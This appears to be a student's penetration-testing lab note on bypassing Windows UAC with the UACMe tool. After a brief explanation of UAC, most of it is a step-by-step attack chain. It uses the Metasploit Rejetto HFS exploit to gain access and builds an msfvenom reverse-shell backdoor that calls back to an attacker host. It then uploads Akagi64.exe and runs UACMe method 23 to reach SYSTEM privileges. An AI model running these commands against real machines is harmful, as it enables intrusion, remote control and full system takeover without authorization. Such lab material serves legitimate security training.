Bypassing UAC With UACMe

#### UAC
- User Account Contorl is a Windows Security feature introduced in Windows Vista that is used to prevent unauthorized changes from being made to the operating system.
- UAC is used to ensure that changes to the operating system require approval from the adminitrator or a user account that is part of the local adminitrators group.
- A non-privileged user attempting to execute a program with elevated privileges will be prompted with the UAC credential prompt,whereas a privileged user will be prompted with a consent prompt.
- Attacks can bypass UAC in order to execute malicious executables with elevated privileges.
#### Bypassing UAC
- In order to successfully bypass UAC,we will need to have access to a user account that is a part of the local administrators group on the Windows target system.
- UAC allows a program to be executed with administrative privileges,consequently prompting the user for confirmation.
- There are multiple tools and technique that can be used to bypass UAC,however,the tool and technique used will depend on the version of Windows running on the target system.

#### Bypassing UAC with UACMe
- UACMe is an open source,robust privilge escalation tool developed by @hfire0x.It can be used to bypass Windows UAC by leveraging various techniques
- - Github: https://github.com/hfiref0x/UACME
- The UACMe github repository contains a very well documented list of methods that can be used to bypass UAC on multiple versions of Windows ranging from Windows 7 to Windows 10.
- It allows attackers to execute malicious payloads on a windows target with administrative/elevated privilges by abuisng the inbuit windows AuteElevated tool.
- The UACMe github repository has more than 60 exploits that can be used to bypass UAC  depending on the version of Windows running on the target.

#### in commnad prompt cmd
- net  users [ this will list all the users]
- net localgroup administrator [ this will list all the local members group of administrator ]
#### managing uac control
- in windows search for uac
- set the security level from GUI
#### Exploiting
- nmap 10.2.22.220 [ this will all the services]
- service postgresql start
- msfconsole
- setg RHOSTS 10.2.22.220
- search rejetto
- use exploit/windows/http/rejetto_hfs_exec 
- set everything requires
- this will give meterpreter session
- sysinfo [ for basic information ]
- pgrep explorer  [ for migrate to explorer session this will give us id ]
-  migrate 2448 [ 2448 found from previous command id and this will give us x64 bit windows ,we can check it again using sysinfo] 
- getuid [ for checking user ]
- getrivs [ trying to get privileges the current user have]
- shell [ for getting shell ]
- net users [ list all users ]
- net localgroup administrators [ this will show members of administrative group ]
- As our current user is part of administrative group we can use UAC for privilege escalation
- now back to meterpreter sessions
- now we need to create msfvenom paylaods so move in tab
- msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT= 1234 -f exe >backdoor.exe
- now open msfconsole in new tab
- use multi/handler
- set payload windows/meterpreter/reverse_tcp
- set LHOST 10.10.5.2
- set LPORT 1234
- now back to previous meterpeter sessions
- cd C:\\ [move to root folder\
- mkdir Temp [ create Temp directory ]
- uplaod backdoor.exe [ here backdoor.exe is msfvenom payload]
- upload /root/Desktop/tools/UACME/Akagi64.exe [ this will upload  uacme binaries into temp folder ]
- shell [ get a shell ]
- .\Akagi64.exe 23 C:\Temp\backdoor.exe [ here 23 is method from github module ]
- this will give us new meterpreter session in multi/handler
- getprivs  [ this will give us all the privileges it has ]
- ps [ list all the processes ]
- migrate 688 [ here 688 is process number,as we are privileged we can migrate to any process ]
- getuid [ this will show us NT AUTHORITY\SYSTEM ]
  
